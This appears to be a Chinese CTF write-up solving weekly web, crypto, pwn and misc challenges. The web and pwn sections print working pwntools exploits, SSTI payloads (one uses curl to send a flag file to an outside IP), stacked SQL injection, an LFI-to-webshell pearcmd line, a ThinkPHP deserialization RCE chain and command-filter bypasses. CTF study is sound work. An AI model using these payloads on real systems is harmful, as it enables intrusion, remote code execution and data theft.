> qsdz开发了一个查询网页，但是好像存在一些漏洞？

![image-20221016163612357](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161636553.png?x-oss-process=hzy)

一个查询页面，有数据就显示查询到的内容，无数据就显示null

![image-20221016163657789](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161636890.png?x-oss-process=hzy)

![image-20221016163709429](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161637534.png?x-oss-process=hzy)

而且只能数字，字母被过滤了

![image-20221016163809004](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161638125.png?x-oss-process=hzy)

源码泄露

```
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <title>Search Page</title>
    <link rel="stylesheet" type="text/css" href="css/style.css" tppabs="css/style.css" />
    <style>
        body {
            height: 100%;
            background: #16a085;
            overflow: hidden;
        }

        canvas {
            z-index: -1;
            position: absolute;
        }
    </style>
    <script src="js/jquery.js"></script>
    <script src="js/verificationNumbers.js" tppabs="js/verificationNumbers.js"></script>
    <script src="js/Particleground.js" tppabs="js/Particleground.js"></script>
    <script>
        $(document).ready(function() {
            $('body').particleground({
                dotColor: '#5cbdaa',
                lineColor: '#5cbdaa'
            });
        });ß
    </script>
</head>
<!--unremove DEBUG function, please delete it-->
<body>
    <dl class="admin_login">
        <dt>
            <font color="white"><strong>Search Page Beta</strong></font>
        </dt>
        <form action="index.php" method="post">
            <dd class="user_icon">
                <input type="text" name="id" placeholder="用户ID" class="login_txtbx" />
            </dd>
            <dd>
                <input type="submit" value="Search" class="submit_btn" />
            </dd>
        </form><br>
        <center>
            <font size="4px" color="white">
                <?php
                error_reporting(0);
                $id = $_POST['id'];
                function waf($str)
                {
                    if (!is_numeric($str) || preg_replace("/[0-9]/", "", $str) !== "") {
                        return False;
                    } else {
                        return True;
                    }
                }

                function send($data)
                {
                    $options = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => 'Content-type: application/json',
                            'content' => $data,
                            'timeout' => 10 * 60
                        )
                    );
                    $context = stream_context_create($options);
                    $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
                    return $result;
                }

                if (isset($id)) {
                    if (waf($id)) {
                        isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
                        $res = json_decode(send($data));
                        if ($res->data->users_user_by_pk->name !== NULL) {
                            echo "ID: " . $id . "<br>Name: " . $res->data->users_user_by_pk->name;
                        } else {
                            echo "<b>Can't found it!</b><br><br>DEBUG: ";
                            var_dump($res->data);
                        }
                    } else {
                        die("<b>Hacker! Only Number!</b>");
                    }
                } else {
                    die("<b>No Data?</b>");
                }
                ?>
            </font>
        </center>
    </dl>
</body>

</html>
```

这是graphql的api

![image-20221016164712308](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161647384.png?x-oss-process=hzy)

能完全控制执行语句，具有回显，具体操作如下

```
data={"query":"{__schema {types {name}}}"}&id=1
```

![image-20221016164903305](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161649504.png?x-oss-process=hzy)

```
data={"query":"\u0071\u0075\u0065\u0072\u0079\u007b\u005f\u005f\u0074\u0079\u0070\u0065\u0028\u006e\u0061\u006d\u0065\u003a\u0022\u0066\u0066\u0066\u0066\u006c\u006c\u006c\u006c\u0061\u0061\u0061\u0067\u0067\u0067\u0067\u005f\u0031\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0066\u006c\u0061\u0067\u0022\u0029\u007b\u0020\u0066\u0069\u0065\u006c\u0064\u0073\u0020\u007b\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u0020\u006e\u0061\u006d\u0065\u0020\u0074\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u006f\u0066\u0054\u0079\u0070\u0065\u0020\u007b\u0020\u006e\u0061\u006d\u0065\u0020\u006b\u0069\u006e\u0064\u0020\u0064\u0065\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006f\u006e\u007d\u007d\u007d\u007d\u007d"}&id=1
```

![image-20221016165027639](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161650778.png?x-oss-process=hzy)

```
data={"query":"query{ffffllllaaagggg_1n_h3r3_flag{flag}}"}&id=1
```

![image-20221016165116580](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161651753.png?x-oss-process=hzy)

flag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}

# WEEK2|CRYPTO

## ezRabin

题目如下

```
from Crypto.Util.number import *
from somewhere_you_do_not_know import flag
#flag格式为 flag{XXXX}
def ezprime(n):
    p=getPrime(n)
    while p%4!=3:
        p=getPrime(n)
    return p
p=ezprime(512)
q=ezprime(512)
n=p*q
m=bytes_to_long(flag)
m=(m<<(300))+getRandomNBitInteger(300)
assert m**2>n and m<n
c=pow(m,4,n)
print('c=',c)
print('p=',p)
print('q=',q)
'''
c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109
p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571
q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379
就要花里胡哨（

```

知道n，c，p，q，e

脚本如下

```
from sympy import *
from gmpy2 import *
from libnum import *

c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109
p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571
q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379


c1=nthroot_mod(c, 4, p, all_roots=True)
c2  =nthroot_mod(c, 4, q, all_roots=True)

x1=solve_crt([c1[0],c2[0]],[p,q ])
x2=solve_crt([c1[0],c2[1]],[p,q ])
x3=solve_crt([c1[1],c2[0]],[p,q ])
x4=solve_crt([c1[1],c2[1]],[p,q ])

print (hex(x4)[2:96])

```

flag{R4bin_3ncrypti0n_with_3_mod_4_is_two_e4sy}

[【CTF-RSA】rabin解密脚本 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13467317/)

## unusual_base

题目如下

```
from secret import flag
from Crypto.Util.number import *
from random import shuffle
from string import ascii_lowercase, ascii_uppercase, digits

alphabet = ascii_uppercase + ascii_lowercase + digits +'$&'
alphabet = list(alphabet)
bits = ''
pad_len = len(flag) % 3

for f in flag:
            bits += bin(f)[2:].rjust(8,'0')
bits += '0000'*pad_len
encoded = ''
shuffle(alphabet)
alphabet = "".join(alphabet)
for i in range(0, len(bits), 6):
    encoded += alphabet[int(bits[i:i+6], 2)]
encoded += '%'*pad_len
print(f'encoded = "{encoded}"')
print(f'alphabet = "{alphabet}"')
```

```
encoded = "GjN3G$B3de58ym&7wQh9dgVNGQhfG2hndsGjlOyEdaxRFY%"
alphabet = "c5PKAQmgI&qSdyDZYCbOV2seXGloLwtFW3f9n7j481UMHBp6vNETRJa$rxuz0hik"
```

将原base64表中的+/换成了$&，并将顺序打乱，形成了一个叫alphabet的表，按这个表编码了明文，在base64中用于填充的“=”这里也被换成了“%”。

# WEEK2|PWN

## 砍一刀

exp如下

```
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")
p = remote('node4.buuoj.cn',26132)
#p = process('./kan')
#gdb.attach(p, '')
payload=fmtstr_payload(8,{0x0404090:0xA})
while(1):
    x=p.recv()
    if "回车".encode() in x:
        p.send(b'\n')
    if b"666" in x:
        p.sendline(b'666')
    if "输入口令=".encode() in x:
        p.send(payload)
        break
    sleep(0.5)
    
p.sendline(b'cat flag')
p.interactive()

```

![image-20221002190248956](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021902041.png?x-oss-process=hzy)

flag{e796196b-280a-4018-a16c-0ef92a951bad}

## shellcode-revenge

exp如下

```
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")
p = remote('node4.buuoj.cn',28308)
#p = process('./shellc')
#gdb.attach(p, '')
p.recvuntil('little.\n')
addr=0x233000

pd = asm(shellcraft.amd64.read(0,0x233050,0x50))
sc = '''
    mov esp, 0x233050
    ret
'''
sc = asm(sc)
pd += sc

payload=asm(shellcraft.cat('flag'))

payload=asm(shellcraft.read(0,0x233000,0x30))+asm("sub rsp,0x30;jmp rsp")

'''
payload = shellcraft.open("flag")
payload += shellcraft.sendfile(1,3, 0x30)
'''
p.send(pd)


p.recvuntil('time~\n')
p.sendline(flat({
    56: p64(0x233000)
}))

p.recvuntil('\n')
payload2 = shellcraft.open("flag")
payload2 += shellcraft.read(3, addr, 0x30)
payload2 += shellcraft.write(1,addr, 0x30)
p.send(p64(0x233058) + asm(shellcraft.cat('flag')))


p.interactive()

```

flag{ad06e958-d7a8-45cb-92e5-624ea8337797}

## buffer-fly

exp如下

```
#!/usr/bin/env python3
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

#p = process('./bf')
p = remote('node4.buuoj.cn', 27967)
elf = ELF('./bf')
#gdb.attach(p, '')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
print(hex(elf.plt['system']))

p.recvuntil('name:')
p.sendline()
p.recvline()
base_addr=(u64(p.recvline()[:-1].ljust(8, b'\x00'))>>4)
print(base_addr)
p.recvuntil('age:')
p.send(b'a'*0x20)
p.recvuntil(b'a'*0x20)
stack_addr=(u64(p.recvline()[:-1].ljust(8, b'\x00')))
print(stack_addr)

p.recvuntil('number:')
p.send(b'sh flag'+b'\x00'*33+p64((base_addr<<12)+0x423)+p64(stack_addr-0x30)+p64((base_addr<<12)+0x29D))
#pop_rdi buf_addr system

p.interactive()

#0x7ffef2cfae70
```

flag{b3c0me_4_butt3rf1y}

## uint32 and ret

无符号型整数溢出

exp如下

```
#!/usr/bin/env python3
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")


p = remote('node4.buuoj.cn', 29442)
#p = process('./uint')
#gdb.attach(p, '')



p.recvuntil('success!')
p.sendline(str(49))
p.recvuntil('twice\n')
p.send(b'a'*88+p64(0x04011BE))

p.interactive()

```

flag{03a739c9-8ed5-42ea-8c0d-a9bfe22c2d80}

# WEEK3|MISC

## Whats HTTP

> 这是什么东西？好像是HTTP，WireShark看看吧

pcap文件，流量分析

![image-20221017125252221](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171252305.png?x-oss-process=hzy)

```
NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==
```

base64+hex转str

flag{4f33649d030c6778426971b54dd72ece}

## qsdz's girlfriend 3

> 我们入侵了qsdz的服务器，你可以在服务器中找到他真实的女朋友吗？qsdz的用户密码是Hikari（请用SSH连接）

![image-20221017130050730](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171300808.png?x-oss-process=hzy)

![image-20221017130232168](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171302229.png?x-oss-process=hzy)

flag{cf737bea-e1bb-4e22-b277-e90ba0fb4cc3}

# WEEK3|WEB

## BabySSTI_One

### 法一

![image-20221009162524984](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091625116.png?x-oss-process=hzy)

ssti,验证一下

![image-20221009162559293](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091625363.png?x-oss-process=hzy)

```
?name={{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}} 
```



![image-20221009162638018](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091626095.png?x-oss-process=hzy)

发现有waf，用a.__getattribute__('__i'+'nit__')替代一下init

![image-20221009163044132](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091630220.png?x-oss-process=hzy)

cat的时候发现被过滤了，nl，tac都不行

使用tail加通配符绕过成功读取flag

![image-20221009163137458](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091631532.png?x-oss-process=hzy)

flag{7490019b-4f30-47e1-8de2-4f86b775969d}

### 法二

这个解法很通用，遇到ssti过滤一堆的时候可以试试这个方法，curl外带flag

```
{%for%0ai%0ain%0a""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u006d\u0072\u006f\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(1)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()%}{%%0aif%0a(i|attr("\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f"))=="\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073"%0a%}{%%0aif%0a(i|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0065\u0076\u0061\u006c")("__import__('os').popen('curl http://43.143.195.203:7777 -d `cat /f*`').read()")%}{%%0aendif%0a%}{%%0aendif%0a%}{%%0aendfor%0a%}
```

unicode编码之后无敌

```
{%for%0ai%0ain%0a""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u006d\u0072\u006f\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(1)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()%}{%%0aif%0a(i|attr("\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f"))=="\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073"%0a%}{%%0aif%0a(i|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0065\u0076\u0061\u006c")("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0035\u002e\u0032\u0030\u0033\u003a\u0037\u0037\u0037\u0037\u0020\u002d\u0064\u0020\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0060\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029")%}{%%0aendif%0a%}{%%0aendif%0a%}{%%0aendfor%0a%}
```

![image-20221016165830122](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161658232.png?x-oss-process=hzy)

flag{37907047-a506-459b-985b-37f2d6c76190}

参考

[[_(:3」」还是被发现了 (pysnow.cn)](https://pysnow.cn/archives/207/)](https://pysnow.cn/archives/453/)



## multiSQL

sql注入，题目提示是堆叠注入

![image-20221009163821784](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091638870.png?x-oss-process=hzy)

and貌似是被过滤了

![image-20221009163931968](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091639035.png?x-oss-process=hzy)

or可以

![image-20221009163945610](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091639669.png?x-oss-process=hzy)

题目说了一点提示

![image-20221009164026789](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091640343.png?x-oss-process=hzy)

fuzz之后发现union.select,upadate等等都被过滤了

堆叠注入使用1';show tables;#，

![image-20221009164244937](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091642006.png?x-oss-process=hzy)

1';show columns from score;#

![image-20221009164332865](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091643944.png?x-oss-process=hzy)

1';replace into score values("火华",10000,200,200);#

![image-20221009164442361](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091644431.png?x-oss-process=hzy)

删除低分

**1';delete from score where listen=11;#**

![image-20221009164533144](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091645201.png?x-oss-process=hzy)

修改之后验证得到flag

![image-20221009164542811](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091645865.png?x-oss-process=hzy)

flag{Ju3t_use_mo2e_t2en_0ne_SQL}



## IncludeTwo

> How to RCE via LFI? P......

题目如下

```
<?php
error_reporting(0);
highlight_file(__FILE__);
//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!
if(!preg_match("/base64|rot13|filter/i",$_GET['file']) && isset($_GET['file'])){
    include($_GET['file'].".php");
}else{
    die("Hacker!");
} Hacker!
```

只能包含php文件，还需要RCE

使用pear.cmd

```
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=eval($_POST[1])?>+/var/www/html/1.php
```

本来用hackbar一直不行，能传上去🐎但是不能用，然后用bp就可以了，应该是编码缘故吧

![image-20221016171943756](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161719868.png?x-oss-process=hzy)

![image-20221016171910199](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161719625.png?x-oss-process=hzy)

flag{f12c8806-82c8-4ac3-bfb5-8cdf6c926dd4}

## Maybe You Have To think More

> PHP反序列化漏洞系列第二题。想啊想啊想不到，这可不是SQL注入哦～～～

> hint；看看Cookie ThinkPHP 5框架反序列化RCE

![image-20221016172150885](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161721952.png?x-oss-process=hzy)

随便输入制造报错发现是thinkphp5.1.41

image-20221016172242171

主界面还给了一个输入传参框，对于thinkphp遇到输入框多半就是反序列化

直接在网上搜一个payload

https://blog.csdn.net/rfrder/article/details/113843768

```
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'huang'=>new Request()
            );
            $this->append=array(
                'huang'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}

```

```
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJodWFuZyI7YToxOntzOjU6ImhlbGxvIjtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToiaHVhbmciO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6ODtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxMDp7czoxMDoidmFyX21ldGhvZCI7czo3OiJfbWV0aG9kIjtzOjg6InZhcl9hamF4IjtzOjA6IiI7czo4OiJ2YXJfcGpheCI7czo1OiJfcGpheCI7czoxMjoidmFyX3BhdGhpbmZvIjtzOjE6InMiO3M6MTQ6InBhdGhpbmZvX2ZldGNoIjthOjM6e2k6MDtzOjE0OiJPUklHX1BBVEhfSU5GTyI7aToxO3M6MTg6IlJFRElSRUNUX1BBVEhfSU5GTyI7aToyO3M6MTI6IlJFRElSRUNUX1VSTCI7fXM6MTQ6ImRlZmF1bHRfZmlsdGVyIjtzOjA6IiI7czoxNToidXJsX2RvbWFpbl9yb290IjtzOjA6IiI7czoxNjoiaHR0cHNfYWdlbnRfbmFtZSI7czowOiIiO3M6MTM6Imh0dHBfYWdlbnRfaXAiO3M6MTQ6IkhUVFBfWF9SRUFMX0lQIjtzOjE1OiJ1cmxfaHRtbF9zdWZmaXgiO3M6NDoiaHRtbCI7fX19fX19
```

传之后得到cookie复制过来之后直接命令执行

![image-20221017120733658](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171207373.png?x-oss-process=hzy)

![image-20221017120806743](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171208816.png?x-oss-process=hzy)

没找到真的flag，看环境变量发现flag

![image-20221017121232206](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171212296.png?x-oss-process=hzy)

flag{b11a41fd-3c21-4922-9d1c-548c6175b490}

# WEEK4|WEB

## BabySSTI_Two(复现)

![image-20221017121442922](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171214020.png?x-oss-process=hzy)

还是ssti

但是上一题ssti那个方法里面有字符被过滤了

```
{{url_for.__getitem__['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('这里填写eval函数的内容，然后用unicode编码一下就行')}}
```

```
{{url_for.__getitem__['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029')}}
```

flag{c97b90f3-4ad7-4f24-a306-305157265b7d}

## So Baby RCE

题目如下

```
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

绕过之后命令执行

知道题目空格用${IFS}代替，/用%0a代替即可绕过执行rce

![image-20221017121942431](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171219513.png?x-oss-process=hzy)

![image-20221017123411804](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171234891.png?x-oss-process=hzy)

> 在这道题目里可以用%0a即回车键代替&&，同时也可以把&url编码使用，读取flag使用sort，同时用？通配符绕过过滤
